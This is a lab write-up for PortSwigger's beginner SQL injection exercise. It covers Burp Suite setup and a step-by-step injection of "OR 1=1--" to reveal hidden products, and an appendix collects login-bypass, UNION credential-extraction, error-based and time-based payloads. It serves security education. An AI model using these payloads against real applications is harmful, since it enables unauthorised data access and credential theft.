# 🛡️ PortSwigger SQL Injection Lab 1 — Complete Reference Guide
> **Lab:** SQL Injection in WHERE Clause (Retrieval of Hidden Data)  
> **Difficulty:** Apprentice  
> **Category:** SQL Injection (SQLi)  
> **Last Updated:** 2026-08-30

---

## 📑 Table of Contents
1. [What You'll Learn](#1-what-youll-learn)
2. [Tools Overview](#2-tools-overview)
3. [Complete Setup Guide](#3-complete-setup-guide)
4. [The Vulnerability Explained](#4-the-vulnerability-explained)
5. [Step-by-Step Attack Walkthrough](#5-step-by-step-attack-walkthrough)
6. [Payload Deep Dive](#6-payload-deep-dive)
7. [Alternative Methods](#7-alternative-methods)
8. [SQL Comment Cheat Sheet](#8-sql-comment-cheat-sheet)
9. [Troubleshooting](#9-troubleshooting)
10. [Key Takeaways](#10-key-takeaways)
11. [Quick Reference Card](#11-quick-reference-card)

---

## 1. What You'll Learn

| Skill | Description |
|-------|-------------|
| 🔍 **Proxy Interception** | Capture and inspect HTTP/HTTPS traffic |
| 🛠️ **Request Modification** | Alter requests before they reach the server |
| 💉 **SQL Injection Basics** | Exploit unsanitized user input in SQL queries |
| 🧠 **Payload Crafting** | Build effective injection strings |
| 🗑️ **Comment Bypass** | Use SQL comments to neutralize trailing code |
| ⚖️ **Operator Precedence** | Understand why `AND` vs `OR` matters |

---

## 2. Tools Overview

### 2.1 Burp Suite

**What it is:** An integrated platform for web application security testing. It acts as a **man-in-the-middle** between your browser and web servers.

```
Your Browser → Burp Proxy → Internet → Web Server
                    ↑
              You inspect & modify
              every request here
```

**Key Components:**

| Component | Icon | Purpose |
|-----------|------|---------|
| **Proxy** | 🌐 | Intercepts HTTP/HTTPS traffic |
| **Repeater** | 🔁 | Manually modify and resend individual requests |
| **Intruder** | 💥 | Automated attacks (brute force, fuzzing) |
| **Decoder** | 🔓 | Encode/decode data (URL, Base64, HTML, etc.) |
| **Comparer** | ⚖️ | Compare two requests/responses side-by-side |

**Editions:**
- **Community (Free)** — Manual testing only, throttled speed ✅ *Sufficient for this lab*
- **Professional ($$$)** — Automated scanning, faster attacks

---

### 2.2 FoxyProxy

**What it is:** A browser extension that lets you toggle proxy settings with **one click**.

**Why you need it:**

```
Without Proxy:  Browser ──────────────→ Website
With Proxy:     Browser → Burp (127.0.0.1:8080) → Website
                              ↑
                        You see everything here
```

**Without FoxyProxy:** You'd dig through Chrome/Firefox settings every time.  
**With FoxyProxy:** One click to route traffic through Burp.

---

## 3. Complete Setup Guide

### 3.1 Install Burp Suite

| Step | Action |
|------|--------|
| 1 | Go to [portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload) |
| 2 | Download for your OS (Windows/Mac/Linux) |
| 3 | Run the installer |
| 4 | Launch Burp Suite Community Edition |
| 5 | Click **"Temporary project"** → **"Use Burp defaults"** |

### 3.2 Verify Proxy Listener

```
Burp Suite → Proxy → Options

You should see:
┌─────────────────────────────────────────┐
│ Interface: 127.0.0.1:8080              │
│ Running: Yes                            │
└─────────────────────────────────────────┘
```

**What this means:** Burp is listening on your local machine, port 8080.

### 3.3 Install FoxyProxy

| Browser | Steps |
|---------|-------|
| **Firefox** | addons.mozilla.org → Search "FoxyProxy Basic" → Install → Click icon → Options |
| **Chrome** | Chrome Web Store → Search "FoxyProxy Basic" → Install → Click icon → Options |

### 3.4 Configure FoxyProxy

Add a new proxy:

| Setting | Value | Why |
|---------|-------|-----|
| **Title** | `Burp` | Easy identification |
| **Type** | `HTTP` | Burp uses HTTP proxy |
| **Hostname** | `127.0.0.1` | Localhost (your machine) |
| **Port** | `8080` | Burp's default listening port |

**Save it.** Now click the FoxyProxy icon → Select **"Burp"** to activate.

### 3.5 Install Burp's CA Certificate (CRITICAL)

**Why?** HTTPS is encrypted. Burp decrypts it to show you traffic. Your browser will show **"Your connection is not private"** warnings unless you trust Burp's certificate.

| Step | Action |
|------|--------|
| 1 | Set FoxyProxy to **Burp** |
| 2 | Visit `http://burpsuite` in your browser |
| 3 | Click **"CA Certificate"** → Download `cacert.der` |
| 4 | Import into browser: |

**Firefox:**
```
Settings → Privacy & Security → Certificates → View Certificates 
→ Authorities → Import → Select cacert.der 
→ ✅ "Trust this CA to identify websites" → OK
```

**Chrome:**
```
Settings → Privacy and security → Security → Manage certificates 
→ Authorities → Import → Select cacert.der 
→ ✅ "Trust this certificate for identifying websites" → OK
```

### 3.6 Test the Setup

| Step | Expected Result |
|------|-----------------|
| 1 | In Burp: Proxy → Intercept → **"Intercept is on"** |
| 2 | FoxyProxy → Select **"Burp"** |
| 3 | Visit `google.com` in browser | **Page hangs** ✅ |
| 4 | Burp Intercept tab shows raw HTTP request | ✅ |
| 5 | Click **Forward** | Page loads ✅ |
| 6 | Turn off: **"Intercept is off"** | Normal browsing resumes |

**🎉 Setup Complete!**

---

## 4. The Vulnerability Explained

### 4.1 The Backend Query

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

| Clause | Meaning |
|--------|---------|
| `SELECT *` | Retrieve all columns |
| `FROM products` | From the `products` table |
| `WHERE category = 'Gifts'` | Filter by category |
| `AND released = 1` | Only show released products |

**The `released = 1` condition hides unreleased products.** Our goal is to bypass this.

### 4.2 How the Application Builds the Query

```python
# Pseudocode — what the backend likely does:
category = request.get("category")  # User input: "Gifts"
query = "SELECT * FROM products WHERE category = '" + category + "' AND released = 1"
```

**The Problem:** User input is **concatenated directly** into SQL without sanitization. This is the root cause of SQL Injection.

### 4.3 The Attack Surface

```
User clicks "Gifts" 
    ↓
Browser sends: GET /filter?category=Gifts
    ↓
Backend inserts "Gifts" into query
    ↓
SQL executes: SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**The injection point:** The `category` parameter in the URL.

---

## 5. Step-by-Step Attack Walkthrough

### Step 1: Access the Lab

| Action | Details |
|--------|---------|
| URL | [portswigger.net/web-security](https://portswigger.net/web-security) |
| Path | SQL Injection → Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data |
| Click | **"Access the lab"** |

You'll see a shopping site with category filters.

### Step 2: Observe Normal Behavior

| Action | Result |
|--------|--------|
| Turn OFF interception in Burp | Normal browsing |
| Click **"Gifts"** | URL becomes: `/filter?category=Gifts` |
| Observe products | Only released gift products shown |

### Step 3: Intercept the Request

| Action | Result |
|--------|--------|
| Turn ON interception in Burp | "Intercept is on" |
| FoxyProxy → Select **"Burp"** | Traffic routed through Burp |
| Click **"Gifts"** again | **Page hangs** ✅ |

**What you see in Burp Intercept:**

```http
GET /filter?category=Gifts HTTP/2
Host: abc123.web-security-academy.net
Cookie: session=xyz789...
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
Accept: text/html,application/xhtml+xml,application/xml;q=0.9...
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://abc123.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

**This is a raw HTTP GET request.** Every line has meaning:

| Line | Purpose |
|------|---------|
| `GET /filter?category=Gifts HTTP/2` | Method, path, query params, HTTP version |
| `Host:` | Target server |
| `Cookie:` | Session identifier |
| `User-Agent:` | Browser identification |
| `Accept:` | What content types the browser accepts |
| `Referer:` | Previous page |

### Step 4: Send to Repeater

| Action | Purpose |
|--------|---------|
| Right-click in intercepted request | Context menu |
| Select **"Send to Repeater"** | Saves request for repeated modification |
| Click **Forward** | Let original request through |
| Go to **Repeater** tab | Your workspace for testing |

**Why Repeater?** You can modify and resend the same request hundreds of times without re-intercepting.

### Step 5: Modify the Request

In Repeater, change:

```
GET /filter?category=Gifts HTTP/2
```

To:

```
GET /filter?category=Gifts'+OR+1=1--+ HTTP/2
```

Click **"Send"**.

### Step 6: Analyze the Response

In the **Response** panel (bottom half):

| Check | Expected |
|-------|----------|
| Status code | `200 OK` |
| Body content | Significantly more products than normal |
| New categories | Products from "Pets", "Tech", etc. mixed in |

**If you see all products including hidden ones → ✅ SUCCESS!**

### Step 7: Lab Completion

PortSwigger auto-detects success. Look for:

```
🎉 "Congratulations, you solved the lab!"
```

---

## 6. Payload Deep Dive

### 6.1 Payload Anatomy

```
Gifts' OR 1=1--+
│      │  │  │
│      │  │  └── Comment start (with space as +)
│      │  └───── Always true condition
│      └──────── Logical OR operator
└─────────────── Original value + quote to close string
```

### 6.2 What Happens in the Database?

**Before injection:**
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**After injection:**
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- ' AND released = 1
```

The `--` comments out everything after it:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1
```

### 6.3 Why Each Part Matters

| Part | Role | Without It |
|------|------|------------|
| `Gifts'` | Closes the opening `'` in the original query | Syntax error: `category = 'Gifts OR 1=1` |
| `OR` | Logical OR — either condition can be true | Would require BOTH conditions: `category = 'Gifts' AND 1=1` |
| `1=1` | Tautology (always true) | No rows returned if category doesn't match |
| `--+` | Comments out `AND released = 1` | Operator precedence trap (see below) |

### 6.4 The Operator Precedence Trap ⚠️

**WRONG approach (without comment):**
```sql
SELECT * FROM products WHERE category = 'Gifts' OR '1'='1' AND released = 1
```

**SQL precedence:** `AND` binds tighter than `OR`:

```sql
WHERE category = 'Gifts' OR ('1'='1' AND released = 1)
```

This becomes:
```sql
WHERE category = 'Gifts' OR released = 1
```

**Problem:** Still hides unreleased products from other categories! ❌

**CORRECT approach (with comment):**
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- ' AND released = 1
```

After comment:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1
```

**Result:** Returns ALL rows! ✅

### 6.5 Valid Payload Variations

| Payload | Type | Notes |
|---------|------|-------|
| `Gifts' OR 1=1--+` | Numeric | Most common, clean |
| `Gifts' OR '1'='1'--+` | String | Also works, more explicit |
| `Gifts' OR 'a'='a'--+` | String | Same logic |
| `Gifts' OR 1=1#` | MySQL | `#` is MySQL comment |
| `Gifts' OR 1=1/*` | Universal | `/*` starts multi-line comment |

### 6.6 Comment Styles Explained

| Style | Databases | URL Encoding |
|-------|-----------|--------------|
| `--+` | Universal | `--` + space (as `+`) |
| `--%20` | Universal | `--` + space (as `%20`) |
| `#` | MySQL only | `%23` |
| `/*` | Universal | No encoding needed |

**Why `--` needs a space:** In SQL, `--` requires a trailing space to be recognized as a comment in some implementations. `+` in URLs decodes to a space.

---

## 7. Alternative Methods

### Method A: Browser URL Bar (Quick Test)

```
https://<lab>.web-security-academy.net/filter?category=Gifts'+OR+1=1--+
```

| Pros | Cons |
|------|------|
| Fast, no tools needed | Harder to analyze response |
| Good for quick checks | URL encoding can be tricky |

### Method B: Burp Intercept (Live Modification)

| Step | Action |
|------|--------|
| 1 | Turn ON interception |
| 2 | Click "Gifts" in lab |
| 3 | Modify `category=Gifts` → `category=Gifts'+OR+1=1--+` in Intercept tab |
| 4 | Click **Forward** |
| 5 | Modified response loads in browser |

| Pros | Cons |
|------|------|
| See result in real browser | Must re-intercept for each test |
| Good for visual confirmation | Slower for iterative testing |

### Method C: Burp Repeater (Recommended)

| Step | Action |
|------|--------|
| 1 | Intercept request → Send to Repeater |
| 2 | Modify payload in Repeater |
| 3 | Click Send → Analyze response |
| 4 | Repeat with variations |

| Pros | Cons |
|------|------|
| Fast iteration | Slightly more setup |
| Easy to compare responses | |
| No re-intercepting needed | |

---

## 8. SQL Comment Cheat Sheet

### By Database

| Database | Single-line | Multi-line | Notes |
|----------|-------------|------------|-------|
| **MySQL** | `-- ` or `#` | `/* */` | `#` is MySQL-specific |
| **PostgreSQL** | `-- ` | `/* */` | Standard SQL |
| **MSSQL** | `-- ` | `/* */` | Standard SQL |
| **Oracle** | `-- ` | `/* */` | Standard SQL |
| **SQLite** | `-- ` | `/* */` | Standard SQL |

### URL Encoding Reference

| Character | URL Encoded | When to Use |
|-----------|-------------|-------------|
| ` ` (space) | `+` or `%20` | After `--` |
| `'` | `%27` | Sometimes needed |
| `#` | `%23` | MySQL comments |
| `=` | `%3D` | Rarely needed |
| `&` | `%26` | In query strings |

---

## 9. Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| "Your connection is not private" | CA cert not installed | Install Burp's CA certificate (Section 3.5) |
| Burp not intercepting | Proxy not configured | Check FoxyProxy is ON and set to 127.0.0.1:8080 |
| "Intercept is off" message | Interception disabled | Click "Intercept is off" → "Intercept is on" |
| Payload returns error | Wrong quote type | Try double quotes: `Gifts" OR 1=1--` |
| Payload does nothing | Comment not working | Try different comment: `#`, `/*`, `--%20` |
| Lab not solved | Not all products shown | Verify payload returns products from ALL categories |
| URL bar changes payload | Browser auto-encoding | Use Burp Repeater instead |
| "Connection refused" | Burp not running | Launch Burp Suite |
| Wrong port | Port conflict | Check Proxy → Options → 127.0.0.1:8080 |

---

## 10. Key Takeaways

### Core Concepts

| # | Concept | Explanation |
|---|---------|-------------|
| 1 | **SQL Injection** | Unsanitized user input in SQL queries lets attackers modify database logic |
| 2 | **Quote Escaping** | `'` closes the string literal, allowing SQL code injection |
| 3 | **Tautology** | `OR 1=1` is always true, bypassing WHERE conditions |
| 4 | **SQL Comments** | `--` neutralizes trailing code you don't want to execute |
| 5 | **Operator Precedence** | `AND` binds tighter than `OR` — critical for payload construction |
| 6 | **Proxy Interception** | Burp lets you see and modify raw HTTP traffic |
| 7 | **Request Replay** | Repeater enables fast, iterative testing |

### The Golden Rule of SQLi

> **Always close what you open, and comment out what you don't need.**

```
Original:  'Gifts' AND released = 1
Injection:  Gifts' OR 1=1-- 
            │    │ │    │ │
            │    │ │    │ └── Comment out the rest
            │    │ │    └──── Always true
            │    │ └───────── Logical OR
            │    └─────────── Close the quote
            └──────────────── Original input
```

---

## 11. Quick Reference Card

### One-Page Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                    SQL INJECTION LAB 1 — QUICK REF               │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  TARGET:  /filter?category=Gifts                                │
│                                                                  │
│  BACKEND QUERY:                                                 │
│  SELECT * FROM products WHERE category = 'Gifts' AND released=1│
│                                                                  │
│  PAYLOAD:  Gifts' OR 1=1--+                                     │
│                                                                  │
│  RESULTING QUERY:                                               │
│  SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- ...   │
│                                                                  │
│  EFFECT:  Returns ALL products (including hidden/unreleased)    │
│                                                                  │
├─────────────────────────────────────────────────────────────────┤
│  SETUP CHECKLIST:                                               │
│  ☐ Burp Suite installed & running                              │
│  ☐ Proxy listener on 127.0.0.1:8080                            │
│  ☐ FoxyProxy installed & configured                            │
│  ☐ CA Certificate installed in browser                         │
│  ☐ Interception test successful                                │
├─────────────────────────────────────────────────────────────────┤
│  PAYLOAD VARIATIONS:                                            │
│  • Gifts' OR 1=1--+        (numeric, most common)               │
│  • Gifts' OR '1'='1'--+    (string comparison)                  │
│  • Gifts' OR 1=1#          (MySQL comment)                      │
│  • Gifts' OR 1=1/*         (universal comment)                  │
└─────────────────────────────────────────────────────────────────┘
```

### HTTP Request Template (Burp Repeater)

```http
GET /filter?category=Gifts'+OR+1=1--+ HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: session=<YOUR_SESSION>
```

### Mind Map: SQL Injection Process

```
                    ┌─────────────────┐
                    │  Find Injection │
                    │     Point       │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │  Test with ' or "│
                    │  Look for errors │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │  Craft Payload  │
                    │  1. Close quote │
                    │  2. Add OR 1=1  │
                    │  3. Comment rest│
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │  Verify Bypass  │
                    │  More data? ✅  │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │   Exploit /     │
                    │   Report        │
                    └─────────────────┘
```

---

## Appendix A: Common SQL Injection Payloads

### Basic Retrieval (This Lab)
```
' OR 1=1--
' OR '1'='1'--
' OR 1=1#
' OR 1=1/*
```

### Login Bypass
```
admin'--
admin' OR '1'='1'--
' OR 1=1 LIMIT 1--
```

### Union-Based (Data Extraction)
```
' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT username,password FROM users--
```

### Error-Based (Information Gathering)
```
' AND 1=CONVERT(int, (SELECT @@version))--
' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--
```

### Time-Based Blind
```
' OR IF(1=1, SLEEP(5), 0)--
' OR pg_sleep(5)--
```

---

## Appendix B: Burp Suite Shortcuts

| Action | Shortcut |
|--------|----------|
| Send to Repeater | `Ctrl + R` |
| Send to Intruder | `Ctrl + I` |
| Forward intercepted request | `Ctrl + F` |
| Drop intercepted request | `Ctrl + T` |
| Toggle interception | `Ctrl + T` |
| Switch to Proxy | `Ctrl + Shift + P` |
| Switch to Repeater | `Ctrl + Shift + R` |

---

## Appendix C: Further Reading

| Resource | Link |
|----------|------|
| PortSwigger SQL Injection Topics | [portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection) |
| OWASP SQL Injection | [owasp.org/Top10/A03_2021-Injection](https://owasp.org/Top10/A03_2021-Injection/) |
| SQL Injection Cheat Sheet | [portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) |
| Burp Suite Documentation | [portswigger.net/burp/documentation](https://portswigger.net/burp/documentation) |

---

> **Remember:** SQL Injection is one of the most critical web vulnerabilities. Understanding it deeply is foundational to web application security testing.

---

*Guide created for deep reference and continuous learning. Bookmark and revisit as you progress through more advanced SQL injection techniques.*
